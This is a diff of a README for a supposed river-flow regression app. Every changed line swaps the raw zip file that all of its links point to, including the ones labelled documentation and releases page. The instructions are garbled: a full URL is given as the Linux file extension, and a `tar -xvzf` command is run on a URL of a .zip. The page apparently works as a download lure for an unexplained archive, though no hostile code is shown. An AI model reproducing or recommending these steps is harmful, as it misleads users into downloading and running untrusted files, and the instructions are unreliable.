@@ -1,6 +1,6 @@
 # 🌊 River_Discharge_Regression - Predict River Flow with Ease
 
-[![Download Now](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip)
+[![Download Now](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -28,14 +28,14 @@ Before you begin, make sure your system meets these basic requirements:
 To install the River_Discharge_Regression application, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download River_Discharge_Regression](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip)
+   [Download River_Discharge_Regression](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip)
 
 2. Look for the latest version of the application. You will find various files available for download.
 
 3. Choose the file that matches your operating system:
    - For Windows, download the file with the `.exe` extension.
    - For macOS, download the file with the `.dmg` extension.
-   - For Linux, download the file with the `https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip` extension.
+   - For Linux, download the file with the `https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip` extension.
 
 4. Click on the file link to start the download. 
 
@@ -55,8 +55,8 @@ To install the River_Discharge_Regression application, follow these steps:
 
 ### For Linux Users
 - Open your terminal.
-- Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip` file.
-- Run the command `tar -xvzf https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip` to extract the files.
+- Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip` file.
+- Run the command `tar -xvzf https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip` to extract the files.
 - Navigate to the extracted folder and run the application with `./application_name`.
 
 ## 📊 How to Use the Application
@@ -82,13 +82,13 @@ We value your input! If you have any suggestions or feedback, please reach out t
 
 ## 📚 Additional Resources
 
-- **Documentation:** Detailed user manuals and technical documentation are available [here](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip).
+- **Documentation:** Detailed user manuals and technical documentation are available [here](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip).
 - **Support:** If you face any issues, check the FAQs or post a question in the community section.
 
 ## 🎉 Join the Community
 
 Become a part of our growing community. Share your experiences, improvements, and use cases with us. Connect with other users to learn from their experiences.
 
-For more updates, check out our [Releases page](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip).
+For more updates, check out our [Releases page](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip).
 
-[![Download Now](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/clat/River_Discharge_Regression.zip)
+[![Download Now](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Pakgamessss/River_Discharge_Regression/main/src/Discharge-River-Regression-v3.5.zip)
